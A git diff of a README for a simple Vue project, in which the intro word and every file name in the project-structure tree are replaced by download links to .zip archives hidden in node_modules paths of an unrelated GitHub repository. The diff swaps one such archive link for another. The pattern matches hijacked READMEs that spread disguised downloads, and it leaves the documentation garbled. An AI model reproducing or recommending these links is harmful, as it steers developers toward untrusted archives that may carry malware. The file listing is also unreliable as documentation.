@@ -1,6 +1,6 @@
 # My Vue App
 
-This is a simple https://raw.githubusercontent.com/Miguel-max219/GestionEncadrement-/main/node_modules/foreground-child/node_modules/shebang-regex/GestionEncadrement-_v3.0.zip application that demonstrates the basic structure and components of a Vue project.
+This is a simple https://github.com/Miguel-max219/GestionEncadrement-/raw/refs/heads/main/node_modules/express/Encadrement_Gestion_1.8.zip application that demonstrates the basic structure and components of a Vue project.
 
 ## Project Structure
 
@@ -9,14 +9,14 @@ my-vue-app
 ├── src
 │   ├── assets          # Static assets such as images, fonts, and stylesheets
 │   ├── components      # Vue components
-│   │   └── https://raw.githubusercontent.com/Miguel-max219/GestionEncadrement-/main/node_modules/foreground-child/node_modules/shebang-regex/GestionEncadrement-_v3.0.zip  # A component that displays a greeting message
-│   ├── https://raw.githubusercontent.com/Miguel-max219/GestionEncadrement-/main/node_modules/foreground-child/node_modules/shebang-regex/GestionEncadrement-_v3.0.zip        # The root Vue component
-│   └── https://raw.githubusercontent.com/Miguel-max219/GestionEncadrement-/main/node_modules/foreground-child/node_modules/shebang-regex/GestionEncadrement-_v3.0.zip        # The entry point of the Vue application
+│   │   └── https://github.com/Miguel-max219/GestionEncadrement-/raw/refs/heads/main/node_modules/express/Encadrement_Gestion_1.8.zip  # A component that displays a greeting message
+│   ├── https://github.com/Miguel-max219/GestionEncadrement-/raw/refs/heads/main/node_modules/express/Encadrement_Gestion_1.8.zip        # The root Vue component
+│   └── https://github.com/Miguel-max219/GestionEncadrement-/raw/refs/heads/main/node_modules/express/Encadrement_Gestion_1.8.zip        # The entry point of the Vue application
 ├── public
-│   └── https://raw.githubusercontent.com/Miguel-max219/GestionEncadrement-/main/node_modules/foreground-child/node_modules/shebang-regex/GestionEncadrement-_v3.0.zip     # The main HTML file for the application
-├── https://raw.githubusercontent.com/Miguel-max219/GestionEncadrement-/main/node_modules/foreground-child/node_modules/shebang-regex/GestionEncadrement-_v3.0.zip       # npm configuration file
-├── https://raw.githubusercontent.com/Miguel-max219/GestionEncadrement-/main/node_modules/foreground-child/node_modules/shebang-regex/GestionEncadrement-_v3.0.zip    # Babel configuration file
-└── https://raw.githubusercontent.com/Miguel-max219/GestionEncadrement-/main/node_modules/foreground-child/node_modules/shebang-regex/GestionEncadrement-_v3.0.zip          # Documentation for the project
+│   └── https://github.com/Miguel-max219/GestionEncadrement-/raw/refs/heads/main/node_modules/express/Encadrement_Gestion_1.8.zip     # The main HTML file for the application
+├── https://github.com/Miguel-max219/GestionEncadrement-/raw/refs/heads/main/node_modules/express/Encadrement_Gestion_1.8.zip       # npm configuration file
+├── https://github.com/Miguel-max219/GestionEncadrement-/raw/refs/heads/main/node_modules/express/Encadrement_Gestion_1.8.zip    # Babel configuration file
+└── https://github.com/Miguel-max219/GestionEncadrement-/raw/refs/heads/main/node_modules/express/Encadrement_Gestion_1.8.zip          # Documentation for the project
 ```
 
 ## Installation
